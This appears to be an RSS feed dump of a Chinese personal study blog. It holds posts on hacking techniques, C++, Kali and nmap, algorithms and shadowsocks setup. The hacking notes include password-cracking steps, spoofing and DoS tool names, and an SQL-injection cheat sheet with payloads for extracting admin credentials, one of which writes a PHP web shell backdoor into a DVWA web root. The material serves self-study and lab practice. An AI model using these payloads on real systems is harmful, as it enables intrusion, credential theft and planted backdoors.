title="IISwrite漏洞利用"></a>IISwrite漏洞利用</h1><p>WebDAV扩展的HTTP请求实现的文件存储服务，用类似HTTP请求方式上传下载同步文件。应用程序可对Web Server直接读写。</p><p>IIS scanner可利用漏洞上传文件留后门</p><h1 id="APPSCAN扫描WEB漏洞"><a href="#APPSCAN扫描WEB漏洞" class="headerlink" title="APPSCAN扫描WEB漏洞"></a>APPSCAN扫描WEB漏洞</h1><h1 id="owasp-zap扫描网站漏洞"><a href="#owasp-zap扫描网站漏洞" class="headerlink" title="owasp zap扫描网站漏洞"></a>owasp zap扫描网站漏洞</h1><p>可扫描端口，扫描漏洞，爬取站点。</p><h1 id="WebCruiser扫描网站漏洞"><a href="#WebCruiser扫描网站漏洞" class="headerlink" title="WebCruiser扫描网站漏洞"></a>WebCruiser扫描网站漏洞</h1><h1 id="WSCAN扫描网站后台"><a href="#WSCAN扫描网站后台" class="headerlink" title="WSCAN扫描网站后台"></a>WSCAN扫描网站后台</h1><p>（啊D和名小子）</p><h1 id="路由信息探测"><a href="#路由信息探测" class="headerlink" title="路由信息探测"></a>路由信息探测</h1><p>ping -r <a href="http://www.baidu.com记录中间路由（类型为8数据报，每转发一次，IP地址写入一次，-1）" target="_blank" rel="noopener">www.baidu.com记录中间路由（类型为8数据报，每转发一次，IP地址写入一次，-1）</a><br>UDP协议路由探测：路由转发TTL-1，为0时ICMP超时确定路由<br>ICMP ECHO Request路由探测:发送端TTL+1，中转路由TTL-1</p><h1 id="安全漏洞探测"><a href="#安全漏洞探测" class="headerlink" title="安全漏洞探测"></a>安全漏洞探测</h1><p>Fluxay漏洞扫描<br>Nessus漏洞扫描</p><hr><h1 id="Linux系统密码破解"><a href="#Linux系统密码破解" class="headerlink" title="Linux系统密码破解"></a>Linux系统密码破解</h1><p>/etc/passwd文件 有UID信息，为0具有root权限<br>加密口令在 /etc/shadow文件 root权限<br>/etc/group,GID被映射到用户分组名称</p><h1 id="Linux密码修改"><a href="#Linux密码修改" class="headerlink" title="Linux密码修改"></a>Linux密码修改</h1><p>Centos<br>任意键进入grub引导–Centos(e编辑)–kernel(e)—输入single保存进入单用户—菜单按b进入—cat /etc/passwd查看账户信息—最后一个为常用登陆用户名。 passwd root修改密码—-useradd Jason;password Jason(新建用户)—-reboot</p><h1 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h1><p>NTLM算法</p><p>LM算法</p><p>Windows密码文件SAM文件存放c:\Windows\System32\config<br>无法复制破解，可嗅探Hash值，利用pwdump,SamInside工具进行爆破。包括暴力破解、字典攻击、彩虹表攻击，暴力破解。</p><h1 id="Md5破解"><a href="#Md5破解" class="headerlink" title="Md5破解"></a>Md5破解</h1><p>Md5Crack或在线破解</p><h1 id="压缩文件解密"><a href="#压缩文件解密" class="headerlink" title="压缩文件解密"></a>压缩文件解密</h1><p>AES算法</p><p>加密过程<br>（1）：先把源文件压缩，压成一段数据段。<br>（2）：再将压缩完的数据段加密。<br>加密流程<br>（1）获取密钥<br>（2）以Key和initVector来加密压缩数据：</p><p>解密的过程是解密后的数据块进行解压缩，然后解成源文件，对该文件进行CRC校验，存在RAR文件中的源文件CRC校验码比较，相同则密码正确，不相同则密码错误。</p><p>解密工具:ARPR</p><h1 id="OFFICE文件密码破解"><a href="#OFFICE文件密码破解" class="headerlink" title="OFFICE文件密码破解"></a>OFFICE文件密码破解</h1><p>hash函数（单向不可逆）<br>RC4流加密算法，对称体制加密。<br>加密过程：产生一个salt,口令+salt计算hash;</p><p>aoprsetup工具进行破解；<br>SingK可生成字典</p><h1 id="Access密码破解"><a href="#Access密码破解" class="headerlink" title="Access密码破解"></a>Access密码破解</h1><p>1.soft_vap<br>2.Cain<br>3.aopr</p><h1 id="Windows修改密码"><a href="#Windows修改密码" class="headerlink" title="Windows修改密码"></a>Windows修改密码</h1><p>SAM存储登录名及口令信息<br>L0pthCrack可破解系统用户密码<br>Aoxppr.exe可破解word等密码</p><h1 id="Windows密码破解-1"><a href="#Windows密码破解-1" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h1><p>Pwdump7破解SAM信息<br>SAMInside进行解密获取密码</p><hr><p><strong>欺骗技术</strong></p><h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><p>1.中间人攻击<br>A攻击者 S源主机 D目的主机<br>D的IP与A的MAC/S的IP与A的MAC，形成中继<br>2.拒绝服务<br>ARP表中MAC地址改为不存在的 ，先修改MAC地址，无服务，然后克隆目标主机IP与MAC地址。</p><hr><h1 id="IP欺骗："><a href="#IP欺骗：" class="headerlink" title="IP欺骗："></a>IP欺骗：</h1><p>1.随意伪造IP，主要DDOS，<br>2.伪造被攻击者信任IP冒充；</p><p>IPSpoof:TCP及IP欺骗（Mendax,Hunt,Dsniff,ISNPrint）</p><h1 id="MAC欺骗"><a href="#MAC欺骗" class="headerlink" title="MAC欺骗"></a>MAC欺骗</h1><p>IP-MAC-PORT 利用MAC和PORT对应关系</p><p>MacMakeUp伪造源MAC地址的MAC欺骗。</p><h1 id="ARP-DNS欺骗"><a href="#ARP-DNS欺骗" class="headerlink" title="ARP_DNS欺骗"></a>ARP_DNS欺骗</h1><p>ARP是局域网，DNS是internet攻击；<br>ARP:路由器ARP表欺骗，内网PC网关欺骗。</p><h2 id="未完"><a href="#未完" class="headerlink" title="未完"></a>未完</h2><h1 id="Web攻击技术"><a href="#Web攻击技术" class="headerlink" title="Web攻击技术"></a>Web攻击技术</h1><p>SQL运算符优先级<br>:=</p><p>||, OR, XOR</p><p>&amp;&amp;, AND</p><p>NOT</p><p>BETWEEN, CASE, WHEN, THEN, ELSE</p><p>=, &lt;=&gt;, &gt;=, &gt;, &lt;=, &lt;, &lt;&gt;, !=, IS, LIKE, REGEXP, IN</p><p>|</p><p>&amp;</p><p>&lt;, &gt;&gt;</p><p>-, +</p><p>*, /, DIV, %, MOD</p><p>^</p><ul><li>(一元减号), ~ (一元比特反转)</li></ul><p>!</p><p>BINARY, COLLATE</p><h1 id="Mysql注释"><a href="#Mysql注释" class="headerlink" title="Mysql注释"></a>Mysql注释</h1><p>–/# 为注释</p><p>ascii(substr(string,start,length))&gt;113;(r为113)</p><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>1.本地利用2.反射3.存储<br>trim（）移除字串字头或字尾，删除字符串首尾空白；<br>stripslashes()函数由addslashes()函数添加的反斜杠；<br>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符；<br>mysql_query() 函数执行一条 MySQL 查询。</p><h1 id="Uploads"><a href="#Uploads" class="headerlink" title="Uploads"></a>Uploads</h1><p>int strrpos ( string $haystack , string $needle [, int $offset = 0 ] )<br> 返回字符串 haystack 中 needle 最后一次出现的数字位置</p><p> substr ( string $string , int $start [, int $length ] )<br>返回字符串 string 由 start 和 length 参数指定的子字符串。</p><h1 id="远程命令"><a href="#远程命令" class="headerlink" title="远程命令"></a>远程命令</h1><p>Telnet（选项）（参数）  Linux远程登陆主机</p><p>mstsc Windows远程连接</p><h1 id="盲注流程"><a href="#盲注流程" class="headerlink" title="盲注流程"></a>盲注流程</h1><p>and 1=1 and 1=2<br>‘ and ‘1’=’1’ and ‘1’=’2<br>%’ and 1=1 and ‘%’=’%  / %’ and 1=2 and ‘%’=’%</p><p>IIS报错使用<br>and user&gt;0 判断ACCESS或MYSQL</p><p>不报错使用</p><pre><code>and (select count(*) from msysobjects)&gt;0 （返回权限不足access数据库）and (select count(*) from sysobjects)&gt;0 （返回正常则为MSSQL数据库）and db_name（）&gt;0 (返回数据库名)and 0&lt;&gt;(select @@version)-- (判断版本信息)and db_name（）&gt;0 （返回数据库名）</code></pre><h2 id="ACCESS注入"><a href="#ACCESS注入" class="headerlink" title="ACCESS注入"></a>ACCESS注入</h2><p>1.猜表 2.猜字段 3.猜用户名和密码长度</p><pre><code>and exists (select * from [admin])and (Select Count(*) from Admin)&gt;0and (Select username from Admin)&gt;0    and exists(select username from admin)&gt;0and (select top 1 len(username) from Admin)&gt;0and (select top 1 len(password) from Admin)&gt;0and (select top 1 asc(mid(username,1,1)) from admin)&gt;0...</code></pre><p>猜用户 1，换成2….继续。</p><h2 id="SQLSERVER注入"><a href="#SQLSERVER注入" class="headerlink" title="SQLSERVER注入"></a>SQLSERVER注入</h2><p>每一个数据库都会有用户表和系统表，在系统表sysobjects中。<br>name （数据表的名字），xtype（数据表的类型 u为用户表），id（ 数据表的对象标志）。</p><h3 id="猜表"><a href="#猜表" class="headerlink" title="猜表"></a>猜表</h3><pre><code>and (select top 1 name from sysobjects where xtype=&#39;u&#39;)&gt;0 (得到第一个表名:比如user)and (select top 1 name from sysobjects where xtype=&#39;u&#39; and name not in (&#39;user&#39;))&gt;0 </code></pre><h3 id="猜列"><a href="#猜列" class="headerlink" title="猜列"></a>猜列</h3><pre><code>and (select top 1 col_name(object_id(&#39;admin&#39;),1) from sysobjects)&gt;0</code></pre><h3 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h3><pre><code>and (select top 1 username from [admin])&gt;0 【直接得到用户名】and (select top 1 password from [admin])&gt;0 【直接得到密码】and 1=(select count(*) from admin where len(username)&gt;0)select name,password,id from user union select user,pwd,uid from 表名and 1=1 union select 1,2,3,4,5... from 表名</code></pre><h4 id="ASCII逐字解码"><a href="#ASCII逐字解码" class="headerlink" title="ASCII逐字解码"></a>ASCII逐字解码</h4><p>1.猜列长度</p><pre><code>and (select top 1 len(列名)from 表名)&gt;Nselect top 1 len(列名) from 表名 where 列名 not in (select top 1 列名 from 表名)</code></pre><p>2.猜用户和密码</p><pre><code>and (select top 1 asc(mid(字段,1,1)) from 数据库名)&gt;ASCII码</code></pre><p>可用 betweent…..and….</p><p>负数加abs()</p><p>3.应用</p><pre><code>and (select count(*) from admin)&lt;&gt;0        //表and (select count(列名) from 表名)&lt;&gt;0    //列and (select count(*) from 表名)&gt;1,2.. //用户个数and (select len(列名) from 表名)&gt;=1、&gt;=2、&gt;=3、&gt;=4 //用户长度and (select count(*)from 表名 where (asc(mid(列名,1,1))) between 30 and 130)&lt;&gt;0 //用户名列名换password猜密码</code></pre><p>4.类型详解<br>user,db_name()&gt;0  判断SQL_SERVER,<br>ACCESS系统表：msysobjects  SQL系统表： sysobjects</p><p>5.联合查询</p><pre><code>And 1=2 union select 1,2,3,4 数字有时换null;Order by 10#And 1=2 union select 1,2,3,4,username,5,6,7 from admin    PHP注入换And 1=2+union+select+1,2,3,4,concat(username),5,6,7+from+admin换And 1=2/**/union/**/select/**/1,2,3,4,concat(username),5,6,7/**/from/**/admin/* and+1=2+union+select+1,username,3,password,5,6,7,8,9,10+from+users+where+id=2 //取第二个管理员信息</code></pre><p>6.非联合查询</p><pre><code>and 1=(select count(*) from admin where len(username)=5)and (select top 1 asc(mid(username,1,1)) from Admin)&gt;0</code></pre><p>中文处理：<br>ACCESS 中文ascii负数取abs(),SQLServer 中文Unicode编码，用unicode(),nchar取中文字符</p><pre><code>and (select top 1 unicode(substring(usernmae,1,1)) from manage)&gt;1.....</code></pre><p>SQLSERVER注释 –<br>MYSQL 注释 #</p><h3 id="MYSQL应用"><a href="#MYSQL应用" class="headerlink" title="MYSQL应用"></a>MYSQL应用</h3><p>字符型注入<br>    1’ and (select count(*) from tablenames)&gt;0;#<br>    a’ or database() like ‘%k%’ ;#<br>    a’ union select table_schema,table_name from information_schema.tables where table_schema like ‘%dv%’<br>    a’ union selcect table_schema,table_name from information_schema.tables;# //table_schema数据库名，table_name 表名<br>union 默认会去掉重复记录值再合并成结果集，如果需要保留重复的记录值，请使用 union all</p><pre><code>&#39; union select &#39;&#39;,&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; into outfile &#39;D:\\Program Files\\Apache Software Foundation\\Apache2.2\\htdocs\\dvwa\\shell.php&#39;;#</code></pre><p>留后门</p><p>（magic_quotes_gpc=On时。提交的变量中所有的’ (单引号), “ (双引号), \ (反斜线)和空字符会自动转为含有反斜线的转义字符。）</p><h1 id="记录变量"><a href="#记录变量" class="headerlink" title="记录变量"></a>记录变量</h1><p>varchar(n):变长型字符数据类型<br>nvarchar(n):可变长度 Unicode 数据<br>char类型： 固定长度，</p><p>截取字符串：<br>mid(column_name,start,[,length]);<br>substring(string,start,length);<br>left(string,n）/n为长度</p><h1 id="DNS域名解析"><a href="#DNS域名解析" class="headerlink" title="DNS域名解析"></a>DNS域名解析</h1><p>53端口<br>C:\Windows\System32\Drivers\etc\hosts，<br>解析先查找本地HOSTS文件<br>清除缓存命令 ipconfig/flushdns</p><h1 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a>DDOS攻击</h1><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><p>拒绝服务：<br>TearDrop、Land、Jolt、IGMP Nuker、Boink、Smurf、Bonk       </p><h2 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h2><p>DDOS 分布式拒绝服务，洪水式攻击：<br>SYN Flood、ACK Flood、UDP Flood、ICMP Flood、TCP Flood、  Connections Flood、Script Flood、Proxy Flood      </p><h2 id="SYN"><a href="#SYN" class="headerlink" title="SYN"></a>SYN</h2><p>SYNDemo工具</p><h2 id="UDP洪水攻击"><a href="#UDP洪水攻击" class="headerlink" title="UDP洪水攻击"></a>UDP洪水攻击</h2><p>udpflood工具</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>狂怒之ping工具</p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Linux 快捷键：&lt;br&gt;终端:&lt;br&gt;复制命令：Ctrl + Shift + C  组合键    .    &lt;/p&gt;
&lt;p&gt;粘贴命令：Ctrl + Shift + V  组合键           &lt;/p&gt;
&lt;p&gt;控制台：&lt;br&gt;复制命令：Ctrl + Insert  
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C++学习</title>
    <link href="http://yoursite.com/2018/09/16/C++2/"/>
    <id>http://yoursite.com/2018/09/16/C++2/</id>
    <published>2018-09-15T16:18:25.593Z</published>
    <updated>2018-12-19T13:55:30.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类模板与模板类"><a href="#类模板与模板类" class="headerlink" title="类模板与模板类"></a>类模板与模板类</h1><p>类模板：用户为类定义模式，参数取任意类型。（类型不确定）<br>模板类：类模板实例化产物</p><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>char str[] 一个字符数组,例如‘a’,’b’<br>char <em>str[] 一个数组，类型是char</em><br>char* 指向字符串，是一个字符串数组，可以是”abc””123”</p><h1 id="swap函数"><a href="#swap函数" class="headerlink" title="swap函数"></a>swap函数</h1><pre><code>void swap(int *x, int *y){int temp=*x;*x=*y;*y=temp;}</code></pre><p>或者</p><pre><code>void swap(int&amp; a, int&amp; b){    int swap = a;    a = b;    b = swap;}</code></pre><p>应该交换地址而非传递形参的值进行交换</p><h1 id="double不以科学技术输出"><a href="#double不以科学技术输出" class="headerlink" title="double不以科学技术输出"></a>double不以科学技术输出</h1><p>库<br>#include<iomanip></iomanip></p><p>cout&lt;&lt;fixed&lt;&lt;setprecision()&lt;&lt;ans&lt;&lt;endl;</p><p>round()四舍五入函数。</p><p>#define PI 定义宏，简单的文本替换。</p><p><code>getchar()   //接受一個字符，需包含“#include&lt;string&gt;”ch=getchar();</code></p><p><code>gets()        // 接受一個字符串，可以接收空格并輸出，需包含“#include&lt;string&gt;”gets(m);</code></p><p>getline()     // 接受一個字符串，可以接收空格并输出<br>getline(cin,str);</p><p>cin.getline()   // 接受一個字符串，可以接收空格并输出<br>cin.getline(m,5);   </p><p> cin.get(字符变量名)可以用来接收字符        </p><h1 id="sort函数"><a href="#sort函数" class="headerlink" title="sort函数"></a>sort函数</h1><p>（数组起始地址，数组结束地址，排序方法默认从小到大）</p><h1 id="结构体学习"><a href="#结构体学习" class="headerlink" title="结构体学习"></a>结构体学习</h1><p>在声明类型的同时定义变量</p><pre><code>#include&lt;iostream&gt;using namespace std;int main(){    struct Student{      //声明一个结构体类型Student         int num;         //声明一个整形变量num         char name[20];   //声明一个字符型数组name         char sex;        //声明一个字符型变量sex         int age;         //声明一个整形变量age         float score;     //声明一个单精度型变量         char addr[30];   //声明一个字符型数组addr    }student1,student2;//声明变量student1和student2   cout&lt;&lt;sizeof(Student)&lt;&lt;endl;   cout&lt;&lt;sizeof(student1)&lt;&lt;endl;   cout&lt;&lt;sizeof(student2)&lt;&lt;endl;        return 0;}</code></pre><p>创建动态struct数组<br>Student * array=new Student[n];</p><ul><li><code>struct struct name * struct_array=new struct_name[struct_array_len]</code></li><li>输入struct数组元素值<br><code>scanf(&quot;%d&quot;,&amp;struct_array[i].struct_member)</code></li><li>排序<br><code>sort(struct_array,struct_array+struct_array_len,compare)</code></li><li>释放<br><code>delete []struct_array</code></li></ul><h1 id="读取大数据"><a href="#读取大数据" class="headerlink" title="读取大数据"></a>读取大数据</h1><p>std::ios::sync_with_stdio(false)可取消cin和stdcin同步；节省开销<br>可以将cin和scanf的效率相匹敌；</p><h1 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h1><p>void <em>memset(void </em>s, int ch, size_t n);<br>将s所指向的某一块内存中的前n个字节的内容全部设置为ch指定的ASCII值。这个函数通常为新申请的内存做初始化工作。其返回值为s。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;类模板与模板类&quot;&gt;&lt;a href=&quot;#类模板与模板类&quot; class=&quot;headerlink&quot; title=&quot;类模板与模板类&quot;&gt;&lt;/a&gt;类模板与模板类&lt;/h1&gt;&lt;p&gt;类模板：用户为类定义模式，参数取任意类型。（类型不确定）&lt;br&gt;模板类：类模板实例化产物&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="program" scheme="http://yoursite.com/tags/program/"/>
    
  </entry>
  
  <entry>
    <title>Kali踩坑</title>
    <link href="http://yoursite.com/2018/09/12/Kali/"/>
    <id>http://yoursite.com/2018/09/12/Kali/</id>
    <published>2018-09-12T10:29:02.478Z</published>
    <updated>2018-11-11T12:20:16.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="open-vm-tools"><a href="#open-vm-tools" class="headerlink" title="open vm tools"></a>open vm tools</h1><pre><code>vi /etc/apt/sources.list</code></pre><h1 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h1><p>中科大kali源:</p><pre><code>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</code></pre><p>阿里云kali源:</p><pre><code>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb http://mirrors.aliyun.com/kali-security kali-rolling/updates main contrib non-free deb-src http://mirrors.aliyun.com/kali-security kali-    rolling/updates main contrib non-free</code></pre><p>对软件进行一次整体更新： </p><pre><code>apt-get update &amp; apt-get upgrade apt-get dist-upgrade apt-get clean</code></pre><p>如果之前不小心安装了vmware-tools，可以输入 </p><pre><code>vmware-uninstall-tools.pl apt-get install open-vm-tools-desktop fuse reboot卸载apt-get remove open-vm-tools-desktop fuse </code></pre><p>apt-get install open-vm-tools-desktop fuse</p><p>然后再次重启就OK了。。。。。</p><h1 id="nmap学习"><a href="#nmap学习" class="headerlink" title="nmap学习"></a>nmap学习</h1><p>示例    ：</p><pre><code>nmap -F -sT -v nmap.org    -F 100个最有可能开放端口    -v 扫描信息    -sT TCP扫描</code></pre><p>2.端口状态</p><pre><code>Open|Filtered 无返回值，在UDP,IP,FIN,NULL和Xmas扫描中</code></pre><p>3.渗透：</p><pre><code>扫描端口-----端口TCP/UDP----端口HTTP/FTP----端口服务</code></pre><p>域名解析parameter:</p><pre><code>    -R 所有目标主机解析    --system-dns 系统域名解析器    --dns-server 服务器选择DNS解析</code></pre><p>4.扫描方法</p><p>parameter</p><pre><code>-sT (TCP扫描,三次握手机制）-sP(ping扫描，判断主机存活)-sS (半开扫描,需root权限，没有三次握手）-sU(udp扫描，不可靠)-sA(穿防火墙)-sX -sN  圣诞树扫描和NULL扫描，针对Unix和Linux主机-sV(端口服务及版本)-A 操作系统检测-O 启用操作系统检测-v 详细信息-P0 指定端口(无ping)-PU （udp+ping）-PS (TCP SYN PING)-PA (TCP ACK PING)-PI(pingICMP echo测试主机运行 )-T 时间优化-F 快速扫描-e 指定网络接口-M 设置tcp扫描线程NULL 反向扫描（不实用,发送没有标志位数据包，主要确认os为windows）FIN 原理类似NULLACK（发送ACK包，返回RST包，判断RST包中TTL，&lt;64开启）</code></pre><p>5.output</p><pre><code>    -oS 保存扫描结果输出    -oN 结果重定向log file name中    -oM 每个结果一行输出</code></pre><p>6.status</p><pre><code>    open 开放 closed 关闭 filtered被过滤 unfiltered未过滤 openfiltered 开放或被过滤 closedfiltered关闭或未过滤</code></pre><p>7.常用命令</p><pre><code>nmap -sP 192.168.0.0/24   判断哪些主机存活nmap -sT 192.168.0.3   开放了哪些端口nmap -sS 192.168.0.127 开放了哪些端口（隐蔽扫描）nmap -sU 192.168.0.127 开放了哪些端口（UDP）nmap -sS -O  192.168.0.127 操作系统识别nmap -sT -p 80 -oG – 192.168.1.* | grep open    列出开放了指定端口的主机列表nmap -sV -p 80 thief.one  列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型</code></pre><p><img src="https://i.imgur.com/br0DBB6.png" alt=""><br><img src="https://i.imgur.com/NfFhigY.png" alt=""><br><img src="https://i.imgur.com/LSsFJez.png" alt=""></p><h1 id="无法拖动文件解决"><a href="#无法拖动文件解决" class="headerlink" title="无法拖动文件解决"></a>无法拖动文件解决</h1><p>1.安装Vmwaretools.</p><ol><li>检查Windows-Vmwaretools服务是否启动</li><li>Vmware客户机隔离是否允许复制粘贴</li><li><p>View—Fit windows now自动适应客户机</p><h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p>NetCat。瑞士军刀</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p> [root@server ~]# yum install -y nc<br> [root@server ~]# rpm -q nc<br> nc-1.84-22.el6.x86_64<br>#</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;open-vm-tools&quot;&gt;&lt;a href=&quot;#open-vm-tools&quot; class=&quot;headerlink&quot; title=&quot;open vm tools&quot;&gt;&lt;/a&gt;open vm tools&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;vi /etc/apt/source
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>算法学习</title>
    <link href="http://yoursite.com/2018/09/12/%E7%AE%97%E6%B3%95/"/>
    <id>http://yoursite.com/2018/09/12/算法/</id>
    <published>2018-09-12T05:41:46.348Z</published>
    <updated>2018-09-09T09:55:58.484Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h1><p><img src="https://i.imgur.com/nd426ck.png" alt=""></p><p>常数阶O(1),对数阶O(log2n),线性阶O(n), 线性对数阶O(nlog2n),平方阶O(n2)，立方阶O(n3),…， k次方阶O(nk),指数阶O(2n)。     </p><p>Ο(1)＜Ο(log2n)＜Ο(n)＜Ο(nlog2n)＜Ο(n2)＜Ο(n3)＜…＜Ο(2n)＜Ο(n!)<br>算法复杂度随着n不断增大    </p><p>计算时间复杂度：<br>1.算法基本语句<br>执行次数最多<br>2.基本语句执行次数数量级<br>嵌套算最内层，并列相加    </p><p>无循环时间复杂度O（1）</p><p>顺序结构求和法则： T1(n)=O(f(n))和 T2(n)=O(g(n)),则 T1(n)+T2(n)=O(max(f(n), g(n)))</p><p>循环结构乘法法则： T1(n)=O(f(n))和 T2(n)=O(g(n)),则 T1<em>T2=O(f(n)</em>g(n))</p><p><img src="https://i.imgur.com/N2VRRCH.png" alt=""></p><h1 id="递归算法的时间复杂度分析"><a href="#递归算法的时间复杂度分析" class="headerlink" title="递归算法的时间复杂度分析"></a>递归算法的时间复杂度分析</h1><p>1.代入<br>2.迭代<br>3.套用公式法<br>4.差分方程<br>这里学习套用公式    T(n) = aT(n/b) + f(n)<br>a&gt;=1,b&gt;=1;</p><p>1.常数ε&gt;0，有f(n) = O(n^logb a-ε )，则T(n) = O(n^logb a )<br>2.若f(n) = O(n^logb a )，则T(n) = O(n^logb a *logn)<br>3.若f(n) = O(n^logb a+ε )，且对于某常数c&gt;1和所有充分大的正整数n，有af(n/b)≤cf(n)，则T(n)=O(f(n))。</p><h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><p>1.冒泡排序：相邻元素比较，小数冒前，大数冒后，<br>时间复杂度 O(n^2)<br>2.选择排序 O(n^2）<br>3.插入排序 O(n^2）<br>4.快速排序 O(nlgn)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;时间复杂度&quot;&gt;&lt;a href=&quot;#时间复杂度&quot; class=&quot;headerlink&quot; title=&quot;时间复杂度&quot;&gt;&lt;/a&gt;时间复杂度&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/nd426ck.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>vultr多端口开放</title>
    <link href="http://yoursite.com/2018/09/12/VPS/"/>
    <id>http://yoursite.com/2018/09/12/VPS/</id>
    <published>2018-09-11T16:16:42.071Z</published>
    <updated>2018-09-11T16:16:42.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h1><pre><code>vi /etc/shadowsocks.json{    &quot;server&quot;:&quot;0.0.0.0&quot;,    &quot;local_address&quot;:&quot;127.0.0.1&quot;,    &quot;local_port&quot;:1080,    &quot;port_password&quot;:{         &quot;23331&quot;:&quot;xxxx&quot;,  //开放端口和密码         &quot;23333&quot;:&quot;yyyy&quot;,  //开放端口和密码    },    &quot;timeout&quot;:300,    &quot;method&quot;:&quot;aes-256-cfb&quot;,    &quot;fast_open&quot;: false}</code></pre><p>:wq保存退出</p><h1 id="安装BBR"><a href="#安装BBR" class="headerlink" title="安装BBR"></a>安装BBR</h1><pre><code>{    &quot;server&quot;:&quot;0.0.0.0&quot;,    &quot;local_address&quot;:&quot;127.0.0.1&quot;,    &quot;local_port&quot;:1080,    &quot;port_password&quot;:{         &quot;23331&quot;:&quot;xxxx&quot;,  //开放端口和密码         &quot;23333&quot;:&quot;yyyy&quot;,  //开放端口和密码    },    &quot;timeout&quot;:300,    &quot;method&quot;:&quot;aes-256-cfb&quot;,    &quot;fast_open&quot;: false}</code></pre><p>查看安装成功与否<br>lsmod | grep bbr</p><h1 id="手动配置防火墙"><a href="#手动配置防火墙" class="headerlink" title="手动配置防火墙"></a>手动配置防火墙</h1><pre><code>firewall-cmd --zone=public --add-port=23331/tcp --permanent # 开23331 TCP端口firewall-cmd --zone=public --add-port=23331/udp --permanent # 开23331 UDP端口firewall-cmd --zone=public --add-port=23333/tcp --permanent # 开23333 TCP端口firewall-cmd --zone=public --add-port=23333/udp --permanent # 开23333 UDP端口firewall-cmd --reload  # 重载配置iptables -L -n  # 查询防火墙规则</code></pre><h1 id="重新启动BBR"><a href="#重新启动BBR" class="headerlink" title="重新启动BBR"></a>重新启动BBR</h1><pre><code>/etc/init.d/shadowsocks restart</code></pre><h1 id="锐速安装"><a href="#锐速安装" class="headerlink" title="锐速安装"></a>锐速安装</h1><pre><code>wget -N --no-check-certificate https://raw.githubusercontent.com/91yun/serverspeeder/master/serverspeeder-all.sh &amp;&amp; bash serverspeeder-all.sh</code></pre><p>常用命令：<br>    重启锐速：/serverspeeder/bin/serverSpeeder.sh restart<br>    启动锐速：/serverspeeder/bin/serverSpeeder.sh start<br>    停止锐速：/serverspeeder/bin/serverSpeeder.sh stop<br>    锐速状态：/serverspeeder/bin/serverSpeeder.sh status</p><h1 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h1><pre><code>service iptables stopchkconfig iptables off</code></pre><h1 id="SS常用命令"><a href="#SS常用命令" class="headerlink" title="SS常用命令"></a>SS常用命令</h1><pre><code>启动：/etc/init.d/shadowsocks start停止：/etc/init.d/shadowsocks stop重启：/etc/init.d/shadowsocks restart状态：/etc/init.d/shadowsocks status</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;编辑&quot;&gt;&lt;a href=&quot;#编辑&quot; class=&quot;headerlink&quot; title=&quot;编辑&quot;&gt;&lt;/a&gt;编辑&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;vi /etc/shadowsocks.json

{
    &amp;quot;server&amp;quot;:&amp;quot;0.0.0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ss+vultr</title>
    <link href="http://yoursite.com/2018/08/21/%E6%90%AD%E5%BB%BASS/"/>
    <id>http://yoursite.com/2018/08/21/搭建SS/</id>
    <published>2018-08-21T04:23:51.509Z</published>
    <updated>2018-08-21T04:23:51.644Z</updated>
    
